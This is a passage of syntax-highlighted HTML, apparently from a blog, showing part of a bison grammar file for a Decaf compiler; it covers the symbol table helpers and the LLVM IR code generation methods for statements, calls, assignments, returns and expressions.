class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br><span class="line">1073</span><br><span class="line">1074</span><br><span class="line">1075</span><br><span class="line">1076</span><br><span class="line">1077</span><br><span class="line">1078</span><br><span class="line">1079</span><br><span class="line">1080</span><br><span class="line">1081</span><br><span class="line">1082</span><br><span class="line">1083</span><br><span class="line">1084</span><br><span class="line">1085</span><br><span class="line">1086</span><br><span class="line">1087</span><br><span class="line">1088</span><br><span class="line">1089</span><br><span class="line">1090</span><br><span class="line">1091</span><br><span class="line">1092</span><br><span class="line">1093</span><br><span class="line">1094</span><br><span class="line">1095</span><br><span class="line">1096</span><br><span class="line">1097</span><br><span class="line">1098</span><br><span class="line">1099</span><br><span class="line">1100</span><br><span class="line">1101</span><br><span class="line">1102</span><br><span class="line">1103</span><br><span class="line">1104</span><br><span class="line">1105</span><br><span class="line">1106</span><br><span class="line">1107</span><br><span class="line">1108</span><br><span class="line">1109</span><br><span class="line">1110</span><br><span class="line">1111</span><br><span class="line">1112</span><br><span class="line">1113</span><br><span class="line">1114</span><br><span class="line">1115</span><br><span class="line">1116</span><br><span class="line">1117</span><br><span class="line">1118</span><br><span class="line">1119</span><br><span class="line">1120</span><br><span class="line">1121</span><br><span class="line">1122</span><br><span class="line">1123</span><br><span class="line">1124</span><br><span class="line">1125</span><br><span class="line">1126</span><br><span class="line">1127</span><br><span class="line">1128</span><br><span class="line">1129</span><br><span class="line">1130</span><br><span class="line">1131</span><br><span class="line">1132</span><br><span class="line">1133</span><br><span class="line">1134</span><br><span class="line">1135</span><br><span class="line">1136</span><br><span class="line">1137</span><br><span class="line">1138</span><br><span class="line">1139</span><br><span class="line">1140</span><br><span class="line">1141</span><br><span class="line">1142</span><br><span class="line">1143</span><br><span class="line">1144</span><br><span class="line">1145</span><br><span class="line">1146</span><br><span class="line">1147</span><br><span class="line">1148</span><br><span class="line">1149</span><br><span class="line">1150</span><br><span class="line">1151</span><br><span class="line">1152</span><br><span class="line">1153</span><br><span class="line">1154</span><br><span class="line">1155</span><br><span class="line">1156</span><br><span class="line">1157</span><br><span class="line">1158</span><br><span class="line">1159</span><br><span class="line">1160</span><br><span class="line">1161</span><br><span class="line">1162</span><br><span class="line">1163</span><br><span class="line">1164</span><br><span class="line">1165</span><br><span class="line">1166</span><br><span class="line">1167</span><br><span class="line">1168</span><br><span class="line">1169</span><br><span class="line">1170</span><br><span class="line">1171</span><br><span class="line">1172</span><br><span class="line">1173</span><br><span class="line">1174</span><br><span class="line">1175</span><br><span class="line">1176</span><br><span class="line">1177</span><br><span class="line">1178</span><br><span class="line">1179</span><br><span class="line">1180</span><br><span class="line">1181</span><br><span class="line">1182</span><br><span class="line">1183</span><br><span class="line">1184</span><br><span class="line">1185</span><br><span class="line">1186</span><br><span class="line">1187</span><br><span class="line">1188</span><br><span class="line">1189</span><br><span class="line">1190</span><br><span class="line">1191</span><br><span class="line">1192</span><br><span class="line">1193</span><br><span class="line">1194</span><br><span class="line">1195</span><br><span class="line">1196</span><br><span class="line">1197</span><br><span class="line">1198</span><br><span class="line">1199</span><br><span class="line">1200</span><br><span class="line">1201</span><br><span class="line">1202</span><br><span class="line">1203</span><br><span class="line">1204</span><br><span class="line">1205</span><br><span class="line">1206</span><br><span class="line">1207</span><br><span class="line">1208</span><br><span class="line">1209</span><br><span class="line">1210</span><br><span class="line">1211</span><br><span class="line">1212</span><br><span class="line">1213</span><br><span class="line">1214</span><br><span class="line">1215</span><br><span class="line">1216</span><br><span class="line">1217</span><br><span class="line">1218</span><br><span class="line">1219</span><br><span class="line">1220</span><br><span class="line">1221</span><br><span class="line">1222</span><br><span class="line">1223</span><br><span class="line">1224</span><br><span class="line">1225</span><br><span class="line">1226</span><br><span class="line">1227</span><br><span class="line">1228</span><br><span class="line">1229</span><br><span class="line">1230</span><br><span class="line">1231</span><br><span class="line">1232</span><br><span class="line">1233</span><br><span class="line">1234</span><br><span class="line">1235</span><br><span class="line">1236</span><br><span class="line">1237</span><br><span class="line">1238</span><br><span class="line">1239</span><br><span class="line">1240</span><br><span class="line">1241</span><br><span class="line">1242</span><br><span class="line">1243</span><br><span class="line">1244</span><br><span class="line">1245</span><br><span class="line">1246</span><br><span class="line">1247</span><br><span class="line">1248</span><br><span class="line">1249</span><br><span class="line">1250</span><br><span class="line">1251</span><br><span class="line">1252</span><br><span class="line">1253</span><br><span class="line">1254</span><br><span class="line">1255</span><br><span class="line">1256</span><br><span class="line">1257</span><br><span class="line">1258</span><br><span class="line">1259</span><br><span class="line">1260</span><br><span class="line">1261</span><br><span class="line">1262</span><br><span class="line">1263</span><br><span class="line">1264</span><br><span class="line">1265</span><br><span class="line">1266</span><br><span class="line">1267</span><br><span class="line">1268</span><br><span class="line">1269</span><br><span class="line">1270</span><br><span class="line">1271</span><br><span class="line">1272</span><br><span class="line">1273</span><br><span class="line">1274</span><br><span class="line">1275</span><br><span class="line">1276</span><br><span class="line">1277</span><br><span class="line">1278</span><br><span class="line">1279</span><br><span class="line">1280</span><br><span class="line">1281</span><br><span class="line">1282</span><br><span class="line">1283</span><br><span class="line">1284</span><br><span class="line">1285</span><br><span class="line">1286</span><br><span class="line">1287</span><br><span class="line">1288</span><br><span class="line">1289</span><br><span class="line">1290</span><br><span class="line">1291</span><br><span class="line">1292</span><br><span class="line">1293</span><br><span class="line">1294</span><br><span class="line">1295</span><br><span class="line">1296</span><br><span class="line">1297</span><br><span class="line">1298</span><br><span class="line">1299</span><br><span class="line">1300</span><br><span class="line">1301</span><br><span class="line">1302</span><br><span class="line">1303</span><br><span class="line">1304</span><br><span class="line">1305</span><br><span class="line">1306</span><br><span class="line">1307</span><br><span class="line">1308</span><br><span class="line">1309</span><br><span class="line">1310</span><br><span class="line">1311</span><br><span class="line">1312</span><br><span class="line">1313</span><br><span class="line">1314</span><br><span class="line">1315</span><br><span class="line">1316</span><br><span class="line">1317</span><br><span class="line">1318</span><br><span class="line">1319</span><br><span class="line">1320</span><br><span class="line">1321</span><br><span class="line">1322</span><br><span class="line">1323</span><br><span class="line">1324</span><br><span class="line">1325</span><br><span class="line">1326</span><br><span class="line">1327</span><br><span class="line">1328</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;default-defs.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;decafcomp.cc&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">yylex</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">yyerror</span><span class="params">(<span class="keyword">char</span> *)</span></span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// print AST?</span></span><br><span class="line"><span class="keyword">bool</span> printAST = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this global variable contains all the generated code</span></span><br><span class="line">llvm::Module *TheModule;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">map</span>&lt;<span class="built_in">string</span>, descriptor* &gt; symbol_table;</span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">list</span>&lt;symbol_table &gt; symbol_table_list;</span><br><span class="line">symbol_table symtbl;</span><br><span class="line">symbol_table_list symtblt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this is the method used to construct the LLVM intermediate code (IR)</span></span><br><span class="line">llvm::LLVMContext TheContext;</span><br><span class="line">llvm::LLVMContext &amp;Context = TheContext;</span><br><span class="line">llvm::IRBuilder&lt;&gt; Builder(TheContext);</span><br><span class="line"><span class="comment">// the calls to TheContext in the init above and in the</span></span><br><span class="line"><span class="comment">// following code ensures that we are incrementally generating</span></span><br><span class="line"><span class="comment">// instructions in the right order</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// dummy main function</span></span><br><span class="line"><span class="comment">// WARNING: this is not how you should implement code generation</span></span><br><span class="line"><span class="comment">// for the main function!</span></span><br><span class="line"><span class="comment">// You should write the codegen for the main method as </span></span><br><span class="line"><span class="comment">// part of the codegen for method declarations (MethodDecl)</span></span><br><span class="line"><span class="keyword">static</span> llvm::Function *TheFunction = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">bool</span> get_return;</span><br><span class="line"><span class="built_in">list</span>&lt;llvm::BasicBlock*&gt; cg;</span><br><span class="line"><span class="built_in">list</span>&lt;llvm::BasicBlock*&gt; bg;</span><br><span class="line"></span><br><span class="line"><span class="function">descriptor *<span class="title">get_symbolt</span><span class="params">(<span class="built_in">string</span> name)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> s:symtblt)&#123;</span><br><span class="line">        <span class="built_in">map</span>&lt;<span class="built_in">string</span>, descriptor* &gt;::iterator it;</span><br><span class="line">        <span class="keyword">for</span> (it = s.begin(); it != s.end(); it++) &#123;</span><br><span class="line">            <span class="built_in">string</span> s = it-&gt;first;</span><br><span class="line">            <span class="keyword">if</span>(name == s)</span><br><span class="line">                <span class="keyword">return</span> it-&gt;second;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">descriptor *<span class="title">get_symbol</span><span class="params">(<span class="built_in">string</span> name)</span></span>&#123;</span><br><span class="line">    <span class="built_in">map</span>&lt;<span class="built_in">string</span>, descriptor* &gt;::iterator it;</span><br><span class="line">    <span class="keyword">for</span> (it = symtbl.begin(); it != symtbl.end(); it++) &#123;</span><br><span class="line">        <span class="built_in">string</span> s = it-&gt;first;</span><br><span class="line">        <span class="keyword">if</span>(name == s)</span><br><span class="line">            <span class="keyword">return</span> it-&gt;second;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">put_symbolt</span><span class="params">(<span class="built_in">string</span> name, descriptor * des)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(symtblt.front()[name] != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        symtblt.front()[name] = des;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">put_symbol</span><span class="params">(<span class="built_in">string</span> name, descriptor * des)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(symtbl[name] != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        symtbl[name] = des;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check_symbol</span><span class="params">(<span class="built_in">string</span> name, llvmValue k)</span></span>&#123;</span><br><span class="line">    <span class="built_in">map</span>&lt;<span class="built_in">string</span>, descriptor* &gt;::iterator it;</span><br><span class="line">    <span class="keyword">for</span> (it = symtbl.begin(); it != symtbl.end(); it++) &#123;</span><br><span class="line">        <span class="built_in">string</span> s = it-&gt;first;</span><br><span class="line">        <span class="keyword">if</span>(name == s &amp;&amp; it-&gt;second-&gt;kind == k)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">llvm::Value * <span class="title">decafBlock::Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    symbol_table s;</span><br><span class="line">    symtblt.push_front(s);</span><br><span class="line">    llvm::Value *val = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != FieldDeclList) &#123;</span><br><span class="line">        val = FieldDeclList-&gt;Codegen();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != StateDeclList) &#123;</span><br><span class="line">        val = StateDeclList-&gt;Codegen();</span><br><span class="line">    &#125; </span><br><span class="line">    symtblt.pop_front();</span><br><span class="line">    <span class="keyword">return</span> val; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">llvm::Value * <span class="title">decafStmt::Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    get_return = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;kind == dass)&#123;</span><br><span class="line">        decafAssign* s = (decafAssign*)<span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">return</span> s-&gt;Codegen();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;kind == dcall)&#123;</span><br><span class="line">        decafFunCall* s = (decafFunCall*)<span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">return</span> s-&gt;Codegen();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;kind == dblo)&#123;</span><br><span class="line">        decafBlock* s = (decafBlock*)<span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">return</span> s-&gt;Codegen();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;kind == dret)&#123;</span><br><span class="line">        decafReturn* s = (decafReturn*)<span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">return</span> s-&gt;Codegen();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;kind == dif)&#123;</span><br><span class="line">        decafIF* s = (decafIF*)<span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">return</span> s-&gt;Codegen();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;kind == dfor)&#123;</span><br><span class="line">        decafFor* s = (decafFor*)<span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">return</span> s-&gt;Codegen();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;kind == dwhi)&#123;</span><br><span class="line">        decafWhile* s = (decafWhile*)<span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">return</span> s-&gt;Codegen();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;kind == dcb)&#123;</span><br><span class="line">        decafCB* s = (decafCB*)<span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">return</span> s-&gt;Codegen();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">llvm::Value * <span class="title">decafFunCall::Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    descriptor * des = get_symbol(<span class="keyword">this</span>-&gt;get_name());</span><br><span class="line">    llvm::Function * llvm_func = des-&gt;func;</span><br><span class="line">    llvm::Value *ret_value;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;llvm::Value *&gt; putsargs;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;llvm::Type *&gt; putstypes;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; arg : llvm_func-&gt;args()) &#123;</span><br><span class="line">        llvm::Type* func_type = arg.getType();</span><br><span class="line">        putstypes.push_back(func_type);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> p:<span class="keyword">this</span>-&gt;get_para())&#123;</span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = (decafBinexp *)p;</span><br><span class="line">        llvm::Value* vt = <span class="built_in">exp</span>-&gt;Codegen();</span><br><span class="line">        llvm::Type* func_type = putstypes[i++];</span><br><span class="line">      </span><br><span class="line">        vt = Builder.CreateZExt(vt, func_type, <span class="string">&quot;zexttmp&quot;</span>);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        if(exp-&gt;get_kind() != &quot;VariableExpr&quot;)&#123;</span></span><br><span class="line"><span class="comment">            llvm::ConstantInt* constantInt = llvm::dyn_cast&lt;llvm::ConstantInt&gt;(vt);</span></span><br><span class="line"><span class="comment">            if (constantInt) &#123;</span></span><br><span class="line"><span class="comment">                llvm::APInt apIntValue = constantInt-&gt;getValue();</span></span><br><span class="line"><span class="comment">                int intValue = apIntValue.getZExtValue();</span></span><br><span class="line"><span class="comment">                vt = llvm::ConstantInt::get(func_type, intValue);</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125; </span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        putsargs.push_back(vt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(llvm_func-&gt;getReturnType()-&gt;isVoidTy())</span><br><span class="line">        ret_value = Builder.CreateCall(llvm_func, putsargs);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        ret_value = Builder.CreateCall(llvm_func, putsargs, <span class="string">&quot;calltmp&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> ret_value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">llvm::Value * <span class="title">decafAssign::Codegen</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    decafBinexp* <span class="built_in">exp</span> = <span class="keyword">this</span>-&gt;get_exp();</span><br><span class="line">    <span class="built_in">exp</span>-&gt;Codegen();</span><br><span class="line">    descriptor * des = get_symbolt(<span class="keyword">this</span>-&gt;get_var());</span><br><span class="line">    <span class="keyword">if</span>(des == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        des = get_symbol(<span class="keyword">this</span>-&gt;get_var());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(des-&gt;kind == arrG)&#123; </span><br><span class="line">        llvm::Value *ArrayLoc = Builder.CreateStructGEP(des-&gt;tyg, des-&gt;value, <span class="built_in">std</span>::stol(<span class="keyword">this</span>-&gt;get_arr()-&gt;get_name(),<span class="literal">NULL</span>,<span class="number">10</span>), <span class="string">&quot;arrayloc&quot;</span>);</span><br><span class="line">        Builder.CreateStore(<span class="built_in">exp</span>-&gt;des.value,ArrayLoc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        Builder.CreateStore(<span class="built_in">exp</span>-&gt;des.value,des-&gt;alloc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> des-&gt;value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">llvm::Value * <span class="title">decafReturn::Codegen</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    decafBinexp* <span class="built_in">exp</span> = <span class="keyword">this</span>-&gt;get_exp();</span><br><span class="line">    llvm::BasicBlock* currentBlock = Builder.GetInsertBlock(); </span><br><span class="line">    llvm::Function* currentFunction = currentBlock-&gt;getParent(); </span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">exp</span>)&#123;</span><br><span class="line">        <span class="built_in">exp</span>-&gt;Codegen();</span><br><span class="line">        Builder.CreateRet(<span class="built_in">exp</span>-&gt;des.value);</span><br><span class="line">        get_return = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">exp</span>-&gt;des.value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(currentFunction-&gt;getReturnType()-&gt;isVoidTy())&#123;</span><br><span class="line">            Builder.CreateRetVoid();</span><br><span class="line">        &#125;   </span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            llvm::Value *zero = llvm::ConstantInt::get(currentFunction-&gt;getReturnType(), <span class="number">0</span>);</span><br><span class="line">            Builder.CreateRet(zero);</span><br><span class="line">        &#125;</span><br><span class="line">        get_return = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">llvm::Value *<span class="title">decafArrexp::Codegen</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    descriptor * des = get_symbol(<span class="keyword">this</span>-&gt;get_name());</span><br><span class="line"></span><br><span class="line">    llvm::Value *ArrayLoc = Builder.CreateStructGEP(des-&gt;tyg, des-&gt;value, <span class="built_in">std</span>::stol(<span class="keyword">this</span>-&gt;get_arr()-&gt;get_name(),<span class="literal">NULL</span>,<span class="number">10</span>), <span class="string">&quot;arrayloc&quot;</span>);</span><br><span class="line">    llvm::Value* load = Builder.CreateLoad(ArrayLoc,<span class="string">&quot;arrayval&quot;</span>);</span><br><span class="line">    <span class="keyword">this</span>-&gt;des.value = load;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>-&gt;des.value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">llvm::Value *<span class="title">decafBinexp::Codegen</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;des.kind == valueK || <span class="keyword">this</span>-&gt;des.kind == valueG)&#123;</span><br><span class="line">        decafAllexp * <span class="built_in">exp</span> = (decafAllexp *)<span class="keyword">this</span>; </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">exp</span>-&gt;Codegen();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;des.kind == arrG)&#123;</span><br><span class="line">        decafArrexp * <span class="built_in">exp</span> = (decafArrexp *)<span class="keyword">this</span>; </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">exp</span>-&gt;Codegen();</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;des.kind == expuK)&#123;</span><br><span class="line">        llvm::Value *L = Exp1-&gt;Codegen();</span><br><span class="line">        <span class="keyword">if</span> (L == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">this</span>-&gt;get_op(Option)) &#123;</span><br><span class="line">            <span class="keyword">case</span> nottmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateNot(L, <span class="string">&quot;nottmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;     </span><br><span class="line">            <span class="keyword">case</span> negtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateNeg(L , <span class="string">&quot;negtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>-&gt;des.value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;des.kind == expbK)&#123;</span><br><span class="line">        llvm::Value *L;</span><br><span class="line">        llvm::Value *R;</span><br><span class="line">        <span class="built_in">list</span>&lt;llvm::BasicBlock *&gt; BL;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;get_op(Option) == ortmp)&#123;</span><br><span class="line">            llvm::BasicBlock* currentBlock = Builder.GetInsertBlock(); </span><br><span class="line">            llvm::Function* currentFunction = currentBlock-&gt;getParent();</span><br><span class="line">            </span><br><span class="line">            L = Exp1-&gt;Codegen();</span><br><span class="line">            llvm::BasicBlock* OpValBB = llvm::BasicBlock::Create(Context, <span class="string">&quot;noskct&quot;</span>,currentFunction);</span><br><span class="line">            llvm::BasicBlock* CurBB = llvm::BasicBlock::Create(Context, <span class="string">&quot;skctend&quot;</span>,currentFunction);</span><br><span class="line">            Builder.CreateCondBr(L,CurBB,OpValBB);</span><br><span class="line"></span><br><span class="line">            Builder.SetInsertPoint(OpValBB);</span><br><span class="line">            R = Exp2-&gt;Codegen();</span><br><span class="line">            <span class="keyword">this</span>-&gt;des.value = Builder.CreateOr(L, R, <span 